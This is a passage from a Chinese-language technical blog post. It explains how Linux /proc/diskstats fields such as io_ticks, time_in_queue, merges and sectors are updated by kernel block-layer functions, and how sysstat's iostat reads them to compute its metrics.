5</td></tr></tbody></table><h6 id="&#x6CE8;&#x610F;&#x4E0A;&#x9762;&#x603B;&#x65F6;&#x95F4;&#x662F;53-90&#x65F6;&#x95F4;&#x5185;&#xFF0C;&#x6709;3-9&#x79D2;&#x7684;&#x81EA;&#x7136;&#x65F6;&#x95F4;&#x5185;&#x662F;&#x6709;IO&#x7684;&#xFF0C;&#x5373;IO&#x961F;&#x5217;&#x7684;&#x975E;&#x7A7A;&#x65F6;&#x95F4;&#x4E3A;3-9&#x79D2;&#x3002;"><a href="#&#x6CE8;&#x610F;&#x4E0A;&#x9762;&#x603B;&#x65F6;&#x95F4;&#x662F;53-90&#x65F6;&#x95F4;&#x5185;&#xFF0C;&#x6709;3-9&#x79D2;&#x7684;&#x81EA;&#x7136;&#x65F6;&#x95F4;&#x5185;&#x662F;&#x6709;IO&#x7684;&#xFF0C;&#x5373;IO&#x961F;&#x5217;&#x7684;&#x975E;&#x7A7A;&#x65F6;&#x95F4;&#x4E3A;3-9&#x79D2;&#x3002;" class="headerlink" title="&#x6CE8;&#x610F;&#x4E0A;&#x9762;&#x603B;&#x65F6;&#x95F4;&#x662F;53.90&#x65F6;&#x95F4;&#x5185;&#xFF0C;&#x6709;3.9&#x79D2;&#x7684;&#x81EA;&#x7136;&#x65F6;&#x95F4;&#x5185;&#x662F;&#x6709;IO&#x7684;&#xFF0C;&#x5373;IO&#x961F;&#x5217;&#x7684;&#x975E;&#x7A7A;&#x65F6;&#x95F4;&#x4E3A;3.9&#x79D2;&#x3002;"></a>&#x6CE8;&#x610F;&#x4E0A;&#x9762;&#x603B;&#x65F6;&#x95F4;&#x662F;53.90&#x65F6;&#x95F4;&#x5185;&#xFF0C;&#x6709;3.9&#x79D2;&#x7684;&#x81EA;&#x7136;&#x65F6;&#x95F4;&#x5185;&#x662F;&#x6709;IO&#x7684;&#xFF0C;&#x5373;IO&#x961F;&#x5217;&#x7684;&#x975E;&#x7A7A;&#x65F6;&#x95F4;&#x4E3A;3.9&#x79D2;&#x3002;</h6><blockquote><p>&#x6CE8;&#x610F;&#xFF0C;io_ticks&#x8FD9;&#x4E2A;&#x5B57;&#x6BB5;&#x88AB;iostat&#x7528;&#x6765;&#x8BA1;&#x7B97;%util&#xFF0C;&#x800C;time_in_queue&#x8FD9;&#x4E2A;&#x5B57;&#x6BB5;&#x88AB;iostat&#x7528;&#x6765;&#x8BA1;&#x7B97;avgqu-sz&#xFF0C;&#x5373;&#x5E73;&#x5747;&#x961F;&#x5217;&#x957F;&#x5EA6;&#x3002;</p></blockquote><p>&#x5176;&#x5B9E;&#x4E0D;&#x96BE;&#x7406;&#x89E3;&#x4E86;&#xFF0C;&#x961F;&#x5217;&#x4E2D;&#x4E0D;&#x4E3A;&#x7A7A;&#x7684;&#x65F6;&#x5019;&#x5360;&#x603B;&#x65F6;&#x95F4;&#x7684;&#x6BD4;&#x4F8B;&#x5373;&#x4E3A; %util</p><h2 id="proc-diskstats&#x4E2D;&#x5176;&#x4ED6;&#x6570;&#x636E;&#x9879;&#x7684;&#x66F4;&#x65B0;"><a href="#proc-diskstats&#x4E2D;&#x5176;&#x4ED6;&#x6570;&#x636E;&#x9879;&#x7684;&#x66F4;&#x65B0;" class="headerlink" title="/proc/diskstats&#x4E2D;&#x5176;&#x4ED6;&#x6570;&#x636E;&#x9879;&#x7684;&#x66F4;&#x65B0;"></a>/proc/diskstats&#x4E2D;&#x5176;&#x4ED6;&#x6570;&#x636E;&#x9879;&#x7684;&#x66F4;&#x65B0;</h2><h4 id="&#x65E2;&#x7136;&#x6211;&#x4EEC;&#x4ECB;&#x7ECD;&#x4E86;io-ticks&#x548C;time-in-queue&#xFF0C;&#x6211;&#x4EEC;&#x4E5F;&#x7B80;&#x5355;&#x4ECB;&#x7ECD;&#x4E0B;&#x5176;&#x4ED6;&#x5B57;&#x6BB5;&#x7684;&#x83B7;&#x53D6;&#x3002;"><a href="#&#x65E2;&#x7136;&#x6211;&#x4EEC;&#x4ECB;&#x7ECD;&#x4E86;io-ticks&#x548C;time-in-queue&#xFF0C;&#x6211;&#x4EEC;&#x4E5F;&#x7B80;&#x5355;&#x4ECB;&#x7ECD;&#x4E0B;&#x5176;&#x4ED6;&#x5B57;&#x6BB5;&#x7684;&#x83B7;&#x53D6;&#x3002;" class="headerlink" title="&#x65E2;&#x7136;&#x6211;&#x4EEC;&#x4ECB;&#x7ECD;&#x4E86;io_ticks&#x548C;time_in_queue&#xFF0C;&#x6211;&#x4EEC;&#x4E5F;&#x7B80;&#x5355;&#x4ECB;&#x7ECD;&#x4E0B;&#x5176;&#x4ED6;&#x5B57;&#x6BB5;&#x7684;&#x83B7;&#x53D6;&#x3002;"></a>&#x65E2;&#x7136;&#x6211;&#x4EEC;&#x4ECB;&#x7ECD;&#x4E86;io_ticks&#x548C;time_in_queue&#xFF0C;&#x6211;&#x4EEC;&#x4E5F;&#x7B80;&#x5355;&#x4ECB;&#x7ECD;&#x4E0B;&#x5176;&#x4ED6;&#x5B57;&#x6BB5;&#x7684;&#x83B7;&#x53D6;&#x3002;</h4><h4 id="&#x5728;&#x6BCF;&#x4E2A;IO&#x7ED3;&#x675F;&#x540E;&#xFF0C;&#x90FD;&#x4F1A;&#x8C03;&#x7528;blk-account-io-done&#x51FD;&#x6570;&#xFF0C;&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x4F1A;&#x8D1F;&#x8D23;&#x66F4;&#x65B0;rd-ios-wr-ios&#x3001;rd-ticks-wr-ticks-&#x5305;&#x62EC;&#x4F1A;&#x66F4;&#x65B0;in-flight&#x3002;"><a href="#&#x5728;&#x6BCF;&#x4E2A;IO&#x7ED3;&#x675F;&#x540E;&#xFF0C;&#x90FD;&#x4F1A;&#x8C03;&#x7528;blk-account-io-done&#x51FD;&#x6570;&#xFF0C;&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x4F1A;&#x8D1F;&#x8D23;&#x66F4;&#x65B0;rd-ios-wr-ios&#x3001;rd-ticks-wr-ticks-&#x5305;&#x62EC;&#x4F1A;&#x66F4;&#x65B0;in-flight&#x3002;" class="headerlink" title="&#x5728;&#x6BCF;&#x4E2A;IO&#x7ED3;&#x675F;&#x540E;&#xFF0C;&#x90FD;&#x4F1A;&#x8C03;&#x7528;blk_account_io_done&#x51FD;&#x6570;&#xFF0C;&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x4F1A;&#x8D1F;&#x8D23;&#x66F4;&#x65B0;rd_ios/wr_ios&#x3001;rd_ticks/wr_ticks ,&#x5305;&#x62EC;&#x4F1A;&#x66F4;&#x65B0;in_flight&#x3002;"></a>&#x5728;&#x6BCF;&#x4E2A;IO&#x7ED3;&#x675F;&#x540E;&#xFF0C;&#x90FD;&#x4F1A;&#x8C03;&#x7528;blk_account_io_done&#x51FD;&#x6570;&#xFF0C;&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x4F1A;&#x8D1F;&#x8D23;&#x66F4;&#x65B0;rd_ios/wr_ios&#x3001;rd_ticks/wr_ticks ,&#x5305;&#x62EC;&#x4F1A;&#x66F4;&#x65B0;in_flight&#x3002;</h4><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">void blk_account_io_done(struct request *req)</span><br><span class="line">{</span><br><span class="line">        /*   </span><br><span class="line">         * Account IO completion.  flush_rq isn&apos;t accounted as a</span><br><span class="line">         * normal IO on queueing nor completion.  Accounting the</span><br><span class="line">         * containing request is enough.</span><br><span class="line">         */</span><br><span class="line">        if (blk_do_io_stat(req) &amp;&amp; !(req-&gt;rq_flags &amp; RQF_FLUSH_SEQ)) {</span><br><span class="line">                unsigned long duration = jiffies - req-&gt;start_time;</span><br><span class="line">                /*&#x4ECE;req&#x83B7;&#x53D6;&#x8BF7;&#x6C42;&#x7C7B;&#x578B;&#xFF1A;R / W*/</span><br><span class="line">                const int rw = rq_data_dir(req);</span><br><span class="line">                struct hd_struct *part;</span><br><span class="line">                int cpu; </span><br><span class="line"></span><br><span class="line">                cpu = part_stat_lock();</span><br><span class="line">                part = req-&gt;part;</span><br><span class="line">               /*&#x66F4;&#x65B0;&#x8BFB;&#x6216;&#x5199;&#x6B21;&#x6570;&#xFF0C;&#x81EA;&#x52A0;*/</span><br><span class="line">                part_stat_inc(cpu, part, ios[rw]);</span><br><span class="line">                /*&#x5C06;io&#x7684;&#x5B58;&#x6D3B;&#x65F6;&#x95F4;&#xFF0C;&#x66F4;&#x65B0;&#x5230;rd_ticks or wr_ticks*/</span><br><span class="line">                part_stat_add(cpu, part, ticks[rw], duration);</span><br><span class="line">                /*&#x66F4;&#x65B0;io_ticks&#x548C;time_in_queue*/</span><br><span class="line">                part_round_stats(cpu, part);</span><br><span class="line">                /*&#x5BF9;&#x5E94;infight &#x51CF; 1 */</span><br><span class="line">                part_dec_in_flight(part, rw); </span><br><span class="line"></span><br><span class="line">                hd_struct_put(part);</span><br><span class="line">                part_stat_unlock();</span><br><span class="line">        }                                                                                                                                              </span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">```  </span><br><span class="line"></span><br><span class="line">##### &#x6CE8;&#x610F;part_round_stats&#x4F1A;&#x8C03;&#x7528;&#x4E0A;&#x4E00;&#x5C0F;&#x8282;&#x4ECB;&#x7ECD;&#x7684;part_round_stats_single&#x51FD;&#x6570;&#xFF1A;</span><br><span class="line">```cgo</span><br><span class="line">void part_round_stats(int cpu, struct hd_struct *part)</span><br><span class="line">{</span><br><span class="line">       /*&#x65E2;&#x8981;&#x66F4;&#x65B0;&#x5206;&#x533A;&#x7684;&#x7EDF;&#x8BA1;&#xFF0C;&#x4E5F;&#x8981;&#x66F4;&#x65B0;&#x6574;&#x4E2A;&#x5757;&#x8BBE;&#x5907;&#x7684;&#x7EDF;&#x8BA1;*/</span><br><span class="line">        unsigned long now = jiffies;</span><br><span class="line">        if (part-&gt;partno)</span><br><span class="line">                part_round_stats_single(cpu, &amp;part_to_disk(part)-&gt;part0, now);</span><br><span class="line">        part_round_stats_single(cpu, part, now);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h5 id="&#x8BFB;&#x5199;&#x6247;&#x533A;&#x7684;&#x4E2A;&#x6570;&#x7EDF;&#x8BA1;&#xFF0C;&#x662F;&#x5728;blk-account-io-completion&#x51FD;&#x6570;&#x4E2D;&#x5B9E;&#x73B0;&#x7684;&#xFF1A;"><a href="#&#x8BFB;&#x5199;&#x6247;&#x533A;&#x7684;&#x4E2A;&#x6570;&#x7EDF;&#x8BA1;&#xFF0C;&#x662F;&#x5728;blk-account-io-completion&#x51FD;&#x6570;&#x4E2D;&#x5B9E;&#x73B0;&#x7684;&#xFF1A;" class="headerlink" title="&#x8BFB;&#x5199;&#x6247;&#x533A;&#x7684;&#x4E2A;&#x6570;&#x7EDF;&#x8BA1;&#xFF0C;&#x662F;&#x5728;blk_account_io_completion&#x51FD;&#x6570;&#x4E2D;&#x5B9E;&#x73B0;&#x7684;&#xFF1A;"></a>&#x8BFB;&#x5199;&#x6247;&#x533A;&#x7684;&#x4E2A;&#x6570;&#x7EDF;&#x8BA1;&#xFF0C;&#x662F;&#x5728;blk_account_io_completion&#x51FD;&#x6570;&#x4E2D;&#x5B9E;&#x73B0;&#x7684;&#xFF1A;</h5><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">void blk_account_io_completion(struct request *req, unsigned int bytes)                             {</span><br><span class="line">        if (blk_do_io_stat(req)) {</span><br><span class="line">                const int rw = rq_data_dir(req);</span><br><span class="line">                struct hd_struct *part;</span><br><span class="line">                int cpu; </span><br><span class="line"></span><br><span class="line">                cpu = part_stat_lock();</span><br><span class="line">                part = req-&gt;part;</span><br><span class="line">                /*&#x53F3;&#x79FB;9&#x4F4D;&#xFF0C;&#x76F8;&#x5F53;&#x4E8E;&#x9664;&#x4EE5;512&#x5B57;&#x8282;&#xFF0C;&#x5373;&#x4E00;&#x4E2A;&#x6247;&#x533A;&#x7684;&#x5B57;&#x8282;&#x6570;*/</span><br><span class="line">                part_stat_add(cpu, part, sectors[rw], bytes &gt;&gt; 9);</span><br><span class="line">                part_stat_unlock();</span><br><span class="line">        }    </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>&#x5173;&#x4E8E;merge&#x90E8;&#x5206;&#x7684;&#x7EDF;&#x8BA1;&#xFF0C;&#x5728;blk_account_io_start&#x51FD;&#x6570;&#x4E2D;&#x7EDF;&#x8BA1;&#xFF1A;<br><img src="/2019/03/11/&#x6DF1;&#x5165;&#x7406;&#x89E3;iostat/diskstats_merge.png" title="diskstats_merge"><br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">void blk_account_io_start(struct request *rq, bool new_io)</span><br><span class="line">{</span><br><span class="line">        struct hd_struct *part;</span><br><span class="line">        int rw = rq_data_dir(rq);                                             </span><br><span class="line">        int cpu;</span><br><span class="line">        </span><br><span class="line">        if (!blk_do_io_stat(rq))</span><br><span class="line">                return;</span><br><span class="line">                </span><br><span class="line">        cpu = part_stat_lock();</span><br><span class="line">        </span><br><span class="line">        if (!new_io) {</span><br><span class="line">                /*&#x6CE8;&#x610F;&#xFF0C;merge&#x7684;IO&#x5C31;&#x4E0D;&#x4F1A;&#x5BFC;&#x81F4;in_flight++*/</span><br><span class="line">                part = rq-&gt;part;</span><br><span class="line">                part_stat_inc(cpu, part, merges[rw]);</span><br><span class="line">        } else {</span><br><span class="line">                part = disk_map_sector_rcu(rq-&gt;rq_disk, blk_rq_pos(rq));</span><br><span class="line">                if (!hd_struct_try_get(part)) {</span><br><span class="line">                        part = &amp;rq-&gt;rq_disk-&gt;part0;</span><br><span class="line">                        hd_struct_get(part);</span><br><span class="line">                }</span><br><span class="line">                /*&#x65B0;IO&#xFF0C;&#x66F4;&#x65B0;io_ticks and time_in_queue*/</span><br><span class="line">                part_round_stats(cpu, part);</span><br><span class="line">                /*in_flight &#x52A0;1*/</span><br><span class="line">                part_inc_in_flight(part, rw);</span><br><span class="line">                rq-&gt;part = part;</span><br><span class="line">        }</span><br><span class="line">        </span><br><span class="line">        part_stat_unlock();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="iostat-&#x8F93;&#x51FA;&#x7684;&#x8BA1;&#x7B97;"><a href="#iostat-&#x8F93;&#x51FA;&#x7684;&#x8BA1;&#x7B97;" class="headerlink" title="iostat &#x8F93;&#x51FA;&#x7684;&#x8BA1;&#x7B97;"></a>iostat &#x8F93;&#x51FA;&#x7684;&#x8BA1;&#x7B97;</h2><h4 id="&#x6CE8;&#x610F;&#xFF0C;-proc-diskstats-&#x5DF2;&#x7ECF;&#x5C06;&#x6240;&#x6709;&#x7684;&#x7D20;&#x6750;&#x90FD;&#x51C6;&#x5907;&#x597D;&#x4E86;&#xFF0C;&#x5BF9;&#x4E8E;iostat&#x7A0B;&#x5E8F;&#x6765;&#x8BF4;&#xFF0C;&#x5C31;&#x662F;&#x5C06;&#x5904;&#x7406;&#x8FD9;&#x4E9B;&#x6570;&#x636E;&#xFF0C;&#x7ED9;&#x5BA2;&#x6237;&#x5C55;&#x73B0;&#x51FA;&#x66F4;&#x53CB;&#x597D;&#xFF0C;&#x66F4;&#x6709;&#x610F;&#x4E49;&#x7684;&#x6570;&#x503C;&#x3002;&#x4E8B;&#x5B9E;&#x4E0A;&#xFF0C;iostat&#x7684;&#x6E90;&#x7801;&#x975E;&#x5E38;&#x7684;&#x77ED;&#xFF0C;&#x5B83;&#x5C5E;&#x4E8E;sysstat&#x8FD9;&#x4E2A;&#x5F00;&#x6E90;&#x8F6F;&#x4EF6;&#xFF0C;&#x6574;&#x4E2A;&#x6587;&#x4EF6;&#x5927;&#x5C0F;1619&#x884C;&#x3002;"><a href="#&#x6CE8;&#x610F;&#xFF0C;-proc-diskstats-&#x5DF2;&#x7ECF;&#x5C06;&#x6240;&#x6709;&#x7684;&#x7D20;&#x6750;&#x90FD;&#x51C6;&#x5907;&#x597D;&#x4E86;&#xFF0C;&#x5BF9;&#x4E8E;iostat&#x7A0B;&#x5E8F;&#x6765;&#x8BF4;&#xFF0C;&#x5C31;&#x662F;&#x5C06;&#x5904;&#x7406;&#x8FD9;&#x4E9B;&#x6570;&#x636E;&#xFF0C;&#x7ED9;&#x5BA2;&#x6237;&#x5C55;&#x73B0;&#x51FA;&#x66F4;&#x53CB;&#x597D;&#xFF0C;&#x66F4;&#x6709;&#x610F;&#x4E49;&#x7684;&#x6570;&#x503C;&#x3002;&#x4E8B;&#x5B9E;&#x4E0A;&#xFF0C;iostat&#x7684;&#x6E90;&#x7801;&#x975E;&#x5E38;&#x7684;&#x77ED;&#xFF0C;&#x5B83;&#x5C5E;&#x4E8E;sysstat&#x8FD9;&#x4E2A;&#x5F00;&#x6E90;&#x8F6F;&#x4EF6;&#xFF0C;&#x6574;&#x4E2A;&#x6587;&#x4EF6;&#x5927;&#x5C0F;1619&#x884C;&#x3002;" class="headerlink" title="&#x6CE8;&#x610F;&#xFF0C;/proc/diskstats &#x5DF2;&#x7ECF;&#x5C06;&#x6240;&#x6709;&#x7684;&#x7D20;&#x6750;&#x90FD;&#x51C6;&#x5907;&#x597D;&#x4E86;&#xFF0C;&#x5BF9;&#x4E8E;iostat&#x7A0B;&#x5E8F;&#x6765;&#x8BF4;&#xFF0C;&#x5C31;&#x662F;&#x5C06;&#x5904;&#x7406;&#x8FD9;&#x4E9B;&#x6570;&#x636E;&#xFF0C;&#x7ED9;&#x5BA2;&#x6237;&#x5C55;&#x73B0;&#x51FA;&#x66F4;&#x53CB;&#x597D;&#xFF0C;&#x66F4;&#x6709;&#x610F;&#x4E49;&#x7684;&#x6570;&#x503C;&#x3002;&#x4E8B;&#x5B9E;&#x4E0A;&#xFF0C;iostat&#x7684;&#x6E90;&#x7801;&#x975E;&#x5E38;&#x7684;&#x77ED;&#xFF0C;&#x5B83;&#x5C5E;&#x4E8E;sysstat&#x8FD9;&#x4E2A;&#x5F00;&#x6E90;&#x8F6F;&#x4EF6;&#xFF0C;&#x6574;&#x4E2A;&#x6587;&#x4EF6;&#x5927;&#x5C0F;1619&#x884C;&#x3002;"></a>&#x6CE8;&#x610F;&#xFF0C;/proc/diskstats &#x5DF2;&#x7ECF;&#x5C06;&#x6240;&#x6709;&#x7684;&#x7D20;&#x6750;&#x90FD;&#x51C6;&#x5907;&#x597D;&#x4E86;&#xFF0C;&#x5BF9;&#x4E8E;iostat&#x7A0B;&#x5E8F;&#x6765;&#x8BF4;&#xFF0C;&#x5C31;&#x662F;&#x5C06;&#x5904;&#x7406;&#x8FD9;&#x4E9B;&#x6570;&#x636E;&#xFF0C;&#x7ED9;&#x5BA2;&#x6237;&#x5C55;&#x73B0;&#x51FA;&#x66F4;&#x53CB;&#x597D;&#xFF0C;&#x66F4;&#x6709;&#x610F;&#x4E49;&#x7684;&#x6570;&#x503C;&#x3002;&#x4E8B;&#x5B9E;&#x4E0A;&#xFF0C;iostat&#x7684;&#x6E90;&#x7801;&#x975E;&#x5E38;&#x7684;&#x77ED;&#xFF0C;&#x5B83;&#x5C5E;&#x4E8E;sysstat&#x8FD9;&#x4E2A;&#x5F00;&#x6E90;&#x8F6F;&#x4EF6;&#xFF0C;&#x6574;&#x4E2A;&#x6587;&#x4EF6;&#x5927;&#x5C0F;1619&#x884C;&#x3002;</h4><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">int read_sysfs_file_stat(int curr, char *filename, char *dev_name)</span><br><span class="line">{</span><br><span class="line">        FILE *fp; </span><br><span class="line">        struct io_stats sdev;</span><br><span class="line">        int i;</span><br><span class="line">        unsigned int ios_pgr, tot_ticks, rq_ticks, wr_ticks;</span><br><span class="line">        unsigned long rd_ios, rd_merges_or_rd_sec, wr_ios, wr_merges;</span><br><span class="line">        unsigned long rd_sec_or_wr_ios, wr_sec, rd_ticks_or_wr_sec;</span><br><span class="line"></span><br><span class="line">        /* Try to read given stat file */</span><br><span class="line">        if ((fp = fopen(filename, &quot;r&quot;)) == NULL)</span><br><span class="line">                return 0;</span><br><span class="line"></span><br><span class="line">        i = fscanf(fp, &quot;%lu %lu %lu %lu %lu %lu %lu %u %u %u %u&quot;,</span><br><span class="line">                   &amp;rd_ios, &amp;rd_merges_or_rd_sec, &amp;rd_sec_or_wr_ios, &amp;rd_ticks_or_wr_sec,</span><br><span class="line">                   &amp;wr_ios, &amp;wr_merges, &amp;wr_sec, &amp;wr_ticks, &amp;ios_pgr, &amp;tot_ticks, &amp;rq_ticks);</span><br><span class="line"></span><br><span class="line">        if (i == 11) {</span><br><span class="line">                /* Device or partition */</span><br><span class="line">                sdev.rd_ios     = rd_ios;</span><br><span class="line">                sdev.rd_merges  = rd_merges_or_rd_sec;</span><br><span class="line">                sdev.rd_sectors = rd_sec_or_wr_ios;</span><br><span class="line">                sdev.rd_ticks   = (unsigned int) rd_ticks_or_wr_sec;</span><br><span class="line">                sdev.wr_ios     = wr_ios;</span><br><span class="line">                sdev.wr_merges  = wr_merges;                               </span><br><span class="line">                sdev.wr_sectors = wr_sec;</span><br><span class="line">                sdev.wr_ticks   = wr_ticks;</span><br><span class="line">                sdev.ios_pgr    = ios_pgr;</span><br><span class="line">                sdev.tot_ticks  = tot_ticks;</span><br><span class="line">                sdev.rq_ticks   = rq_ticks;</span><br><span class="line">        }</span><br><span class="line">        else if (i == 4) {</span><br><span class="line">                /* Partition without extended statistics */</span><br><span class="line">                sdev.rd_ios     = rd_ios;</span><br><span class="line">                sdev.rd_sectors = rd_merges_or_rd_sec;</span><br><span class="line">                sdev.wr_ios     = rd_sec_or_wr_ios;</span><br><span class="line">                sdev.wr_sectors = rd_ticks_or_wr_sec;</span><br><span class="line">        }</span><br><span class="line">        if ((i == 11) || !DISPLAY_EXTENDED(flags)) {</span><br><span class="line">                /*</span><br><span class="line">                 * In fact, we _don&apos;t_ save stats if it&apos;s a partition without</span><br><span class="line">                 * extended stats and yet we want to display ext stats.</span><br><span class="line">                 */</span><br><span class="line">                save_stats(dev_name, curr, &amp;sdev, iodev_nr, st_hdr_iodev);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        fclose(fp);</span><br><span class="line">        </span><br><span class="line">        return 1;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="&#x6570;&#x636E;&#x90FD;&#x91C7;&#x96C6;&#x5230;&#x4E86;&#xFF0C;&#x5269;&#x4E0B;&#x5C31;&#x662F;&#x8BA1;&#x7B97;&#x4E86;&#x3002;&#x5176;&#x4E2D;&#x4E0B;&#x9762;&#x51E0;&#x9879;&#x7684;&#x8BA1;&#x7B97;&#x662F;&#x975E;&#x5E38;&#x7B80;&#x5355;&#x7684;&#xFF1A;"><a href="#&#x6570;&#x636E;&#x90FD;&#x91C7;&#x96C6;&#x5230;&#x4E86;&#xFF0C;&#x5269;&#x4E0B;&#x5C31;&#x662F;&#x8BA1;&#x7B97;&#x4E86;&#x3002;&#x5176;&#x4E2D;&#x4E0B;&#x9762;&#x51E0;&#x9879;&#x7684;&#x8BA1;&#x7B97;&#x662F;&#x975E;&#x5E38;&#x7B80;&#x5355;&#x7684;&#xFF1A;" class="headerlink" title="&#x6570;&#x636E;&#x90FD;&#x91C7;&#x96C6;&#x5230;&#x4E86;&#xFF0C;&#x5269;&#x4E0B;&#x5C31;&#x662F;&#x8BA1;&#x7B97;&#x4E86;&#x3002;&#x5176;&#x4E2D;&#x4E0B;&#x9762;&#x51E0;&#x9879;&#x7684;&#x8BA1;&#x7B97;&#x662F;&#x975E;&#x5E38;&#x7B80;&#x5355;&#x7684;&#xFF1A;"></a>&#x6570;&#x636E;&#x90FD;&#x91C7;&#x96C6;&#x5230;&#x4E86;&#xFF0C;&#x5269;&#x4E0B;&#x5C31;&#x662F;&#x8BA1;&#x7B97;&#x4E86;&#x3002;&#x5176;&#x4E2D;&#x4E0B;&#x9762;&#x51E0;&#x9879;&#x7684;&#x8BA1;&#x7B97;&#x662F;&#x975E;&#x5E38;&#x7B80;&#x5355;&#x7684;&#xFF1A;</h4><ul><li>rrqm/s</li><li>wrqm/s</li><li>r/s</li><li>w/s</li><li>rMB/s</li><li>wMB/s</li></ul><p>&#x8FD9;&#x51E0;&#x9879;&#x7684;&#x8BA1;&#x7B97;&#x662F;&#x975E;&#x5E38;&#x7B80;&#x5355;&#x7684;&#xFF0C;&#x5C31;&#x662F;&#x91C7;&#x6837;&#x4E24;&#x6B21;&#xFF0C;&#x540E;&#x4E00;&#x6B21;&#x7684;&#x503C;&#x51CF;&#x53BB;&#x524D;&#x4E00;&#x6B21;&#x7684;&#x503C;&#xFF0C;&#x7136;&#x540E;&#x9664;&#x4EE5;&#x65F6;&#x95F4;&#x95F4;&#x9694;&#xFF0C;&#x5F97;&#x5230;&#x5E73;&#x5747;&#x503C;&#x5373;&#x53EF;&#x3002;&#x56E0;&#x4E3A;&#x8FD9;&#x4E9B;/proc/diskstats&#x4E2D;&#x5BF9;&#x5E94;&#x7684;&#x503C;&#x90FD;&#x662F;&#x7D2F;&#x52A0;&#x7684;&#xFF0C;&#x540E;&#x4E00;&#x6B21;&#x51CF;&#x53BB;&#x524D;&#x4E00;&#x6B21;&#xFF0C;&#x5373;&#x5F97;&#x5230;&#x91C7;&#x6837;&#x65F6;&#x95F4;&#x95F4;&#x9694;&#x5185;&#x7684;&#x65B0;&#x589E;&#x91CF;&#x3002;&#x4E0D;&#x8D58;&#x8FF0;&#x3002;</p><h2 id="avgrq-sz&#x7684;&#x8BA1;&#x7B97;"><a href="#avgrq-sz&#x7684;&#x8BA1;&#x7B97;" class="headerlink" title="avgrq-sz&#x7684;&#x8BA1;&#x7B97;"></a>avgrq-sz&#x7684;&#x8BA1;&#x7B97;</h2><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">/*       rrq/s wrq/s   r/s   w/s  rsec  wsec  rqsz  qusz await r_await w_await svctm %util */</span><br><span class="line">   cprintf_f(2, 8, 2,</span><br><span class="line">             S_VALUE(ioj-&gt;rd_merges, ioi-&gt;rd_merges, itv),</span><br><span class="line">             S_VALUE(ioj-&gt;wr_merges, ioi-&gt;wr_merges, itv));</span><br><span class="line">   cprintf_f(2, 7, 2,</span><br><span class="line">             S_VALUE(ioj-&gt;rd_ios, ioi-&gt;rd_ios, itv),</span><br><span class="line">             S_VALUE(ioj-&gt;wr_ios, ioi-&gt;wr_ios, itv));</span><br><span 